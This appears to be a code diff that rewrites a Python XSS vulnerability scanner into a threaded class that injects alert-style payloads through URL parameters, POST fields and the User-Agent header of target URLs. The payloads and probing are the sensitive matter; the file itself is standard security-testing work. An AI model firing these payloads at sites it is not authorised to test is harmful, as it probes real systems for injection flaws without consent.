@@ -1,39 +1,54 @@
-import argparse
 import requests
+from bs4 import BeautifulSoup
+import threading
 
-# Define common XSS payloads
-XSS_PAYLOADS = [
-    "<script>alert('XSS')</script>",
-    "';alert(1);//",
-    "<img src=x onerror=alert(1)>",
-    "<svg><script>alert('XSS');</script></svg>",
-    "<body onload=alert('XSS')>",
-]
+class XSSScanner:
+    def __init__(self, urls):
+        self.urls = urls
+        self.payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "'><img src=x onerror=alert(1)>",
+            # 21 more payloads...
+        ]
 
-def is_valid_ip(ip):
-    # Function to check if IP is valid
-    parts = ip.split('.')
-    return (len(parts) == 4 and all(part.isdigit() and 0 <= int(part) < 256 for part in parts))
+    def test_xss(self, url):
+        for payload in self.payloads:
+            # Test GET
+            response = requests.get(url + payload)
+            if self.is_vulnerable(response):
+                self.report(url, payload)
 
-def scan_xss(url):
-    for payload in XSS_PAYLOADS:
-        response = requests.get(url + payload)
-        if payload in response.text:
-            print(f"[!] XSS Vulnerability found at {url} with payload: {payload}")
+            # Test POST
+            response = requests.post(url, data={"param": payload})
+            if self.is_vulnerable(response):
+                self.report(url, payload)
 
-def main():
-    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
-    parser.add_argument("target", help="Target IP or domain to scan")
-    args = parser.parse_args()
+            # Headers
+            response = requests.get(url, headers={"User-Agent": payload})
+            if self.is_vulnerable(response):
+                self.report(url, payload)
 
-    # Validate input
-    target = args.target
-    if not (is_valid_ip(target) or target.startswith("http://") or target.startswith("https://")):
-        print("Invalid target. Please provide a valid IP address or domain.")
-        return
+    def is_vulnerable(self, response):
+        return "alert(1)" in response.text
 
-    print(f"Scanning target: {target} ...")
-    scan_xss(target)
+    def report(self, url, payload):
+        print(f'Vulnerable: {url} with payload: {payload}')
 
-if __name__ == "__main__":
-    main()
+    def scan(self):
+        threads = []
+        for url in self.urls:
+            thread = threading.Thread(target=self.test_xss, args=(url,))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+if __name__ == '__main__':
+    urls_to_scan = [
+        'http://example.com',
+    ]  # Add your URLs here
+    scanner = XSSScanner(urls_to_scan)
+    scanner.scan()
